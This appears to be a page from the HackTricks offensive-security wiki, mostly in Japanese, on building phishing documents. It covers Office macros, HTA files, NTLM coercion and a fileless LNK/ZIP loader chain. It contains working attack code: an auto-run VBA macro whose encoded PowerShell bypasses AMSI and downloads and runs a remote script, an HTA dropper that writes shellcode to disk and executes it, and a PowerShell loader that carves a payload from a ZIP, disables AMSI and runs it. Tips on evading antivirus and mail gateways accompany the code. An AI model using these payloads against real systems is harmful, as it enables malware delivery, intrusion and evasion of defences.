# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word は、ファイルを開く前にファイルのデータ検証を行います。データ検証は、OfficeOpenXML 標準に沿ったデータ構造の識別という形で行われます。データ構造の識別中にエラーが発生した場合、解析対象のファイルは開かれません。

通常、macros を含む Word ファイルは `.docm` 拡張子を使用します。しかし、拡張子を変更してファイル名を変更しても、マクロの実行能力を保持することが可能です.\
例えば、RTF ファイルは設計上 macros をサポートしませんが、DOCM ファイルを RTF にリネームすると Microsoft Word により処理され、macros の実行が可能になります.\
同じ内部動作とメカニズムは Microsoft Office Suite (Excel, PowerPoint etc.) のすべてのソフトウェアに適用されます。

以下のコマンドを使用して、どの拡張子がいくつかの Office プログラムによって実行されるかを確認できます：
```bash
assoc | findstr /i "word excel powerp"
```
macros を含むリモートテンプレートを参照する DOCX ファイル（File –Options –Add-ins –Manage: Templates –Go）は、macros を“実行”することもできます。

### External Image Load

Go to: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References、**Filed names**: includePicture、および**Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

文書から任意のコードを実行するためにmacrosを使用することが可能です。

#### Autoload functions

The more common they are, the more probable the AV will detect them.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### メタデータを手動で削除

「**File > Info > Inspect Document > Inspect Document**」に移動すると Document Inspector が表示されます。**Inspect** をクリックし、次に **Document Properties and Personal Information** の横にある **Remove All** をクリックします。

#### Doc 拡張子

完了したら、**Save as type** ドロップダウンで形式を **`.docx`** から **Word 97-2003 `.doc`** に変更します。\
これは、**`.docx` にマクロを保存できない**ことと、マクロ有効の **`.docm`** 拡張子にはスティグマ（例：サムネイルアイコンに大きな `!` が表示され、一部の web/メールゲートウェイが完全にブロックする） があるためです。したがって、この **レガシーな `.doc` 拡張子が最良の妥協策** です。

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA ファイル

HTA は、HTML とスクリプト言語（VBScript や JScript など）を組み合わせた Windows プログラムです。ユーザーインターフェイスを生成し、ブラウザのセキュリティモデルの制約を受けずに「完全に信頼された」アプリケーションとして実行されます。

HTA は **`mshta.exe`** を使用して実行され、通常は **Internet Explorer** とともにインストールされます。これにより **`mshta` は IE に依存** します。したがって、IE がアンインストールされている場合、HTA は実行できなくなります。
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM認証を強制する

**NTLM認証を「リモートで」強制する**方法はいくつかあります。例えば、ユーザがアクセスするメールやHTMLに**見えない画像**を埋め込む（場合によってはHTTP MitMでも）ことや、被害者にフォルダを開くだけで**認証を** **トリガーする**ような**ファイルのアドレス**を送る、などです。

**これらのアイデアやその他の情報は次のページを参照してください：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

ハッシュや認証情報を盗むだけでなく、**NTLM relay attacks**を実行することも可能です：

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

非常に効果的なキャンペーンは、2つの正規のデコイ文書（PDF/DOCX）と悪意ある.lnkを含むZIPを配布します。トリックは、実際のPowerShellローダーがZIPの生バイト列中のユニークなマーカーの後に格納されており、.lnkがそれを切り出してメモリ上で完全に実行する点です。

Typical flow implemented by the .lnk PowerShell one-liner:

1) 一般的なパス（Desktop、Downloads、Documents、%TEMP%、%ProgramData%、およびカレント作業ディレクトリの親）から元のZIPを探す。
2) ZIPのバイトを読み取り、ハードコードされたマーカー（例: xFIQCV）を探す。マーカー以降が埋め込まれたPowerShellペイロードである。
3) %ProgramData%にZIPをコピーし、そこで展開して、デコイの.docxを開いて正当らしく見せる。
4) 現在のプロセスでAMSIをバイパスする: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 次段階をデオブスク化（例: 全ての#文字を削除）し、メモリ上で実行する。

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- 配信では信頼された PaaS サブドメイン（例: *.herokuapp.com）を悪用することが多く、IP/UA に基づいてペイロードを制限し（良性の ZIP を返す）ことがある。
- 次段階では base64/XOR shellcode を復号化し、Reflection.Emit + VirtualAlloc 経由で実行してディスク痕跡を最小化することが多い。

Persistence used in the same chain
- Microsoft Web Browser control の COM TypeLib hijacking により、IE/Explorer やそれを埋め込むアプリがペイロードを自動的に再起動するようにする。詳細とすぐ使えるコマンドは以下を参照:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- アーカイブデータの末尾に ASCII マーカー文字列（例: xFIQCV）が追記された ZIP ファイル。
- .lnk が親/ユーザフォルダを列挙して ZIP を特定し、デコイ文書を開く。
- AMSI を [System.Management.Automation.AmsiUtils]::amsiInitFailed を使って改ざんする。
- 長時間続くビジネススレッドが、信頼された PaaS ドメインにホストされたリンクで終わる。

## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
